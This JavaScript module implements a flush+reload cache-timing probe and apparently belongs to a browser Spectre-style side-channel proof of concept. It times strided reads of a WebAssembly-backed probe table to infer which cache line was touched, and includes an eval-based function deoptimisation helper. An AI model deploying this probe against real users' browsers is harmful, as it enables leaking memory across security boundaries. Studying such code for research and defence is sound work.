import wasm_configuration_promise from "./wasm-configuration.js";
import evictCache from "./evict-cache.js";
import timer_promise from "./timer.js";

export default (async () => {
    const timer = await timer_promise;
    const {
        page_size,
        probe_length,
        probe_table
    } = await wasm_configuration_promise;
    const time_table = new Uint32Array(probe_length);
    return flushReloadProbe;
    
    function flushReloadProbe(probe_table, probe_index) {
        // probe_index = _probe_index;
        // evictCache(cache_size);
        
        // probeTable[0] is always fast for sme reason so average that access out by randomizing the acutal probing index
        const random_offset = Math.random() * 256 | 0;
        // console.log("random offset", random_offset);
        
        let junk = probe_table[((probe_index + 256 - random_offset) % 256) * page_size];
        
        // const deopt_reloadIndex = await deopt(reloadIndex);
        for (let i = 0; i < probe_length; ++i) {
            timer.restore();
            junk ^= probe_table[i * page_size];
            time_table[(i + random_offset) % 256] = timer.load();
        }
        
        return time_table;
    }
    
    function deopt(_function) {
        const function_name = _function.name;
        const new_function_string = _function.toString().replace(`function ${function_name}`, `function deopt_${function_name}_${Math.random().toString().substr(2)}`);
        return eval(`(${new_function_string})`);
    }
})();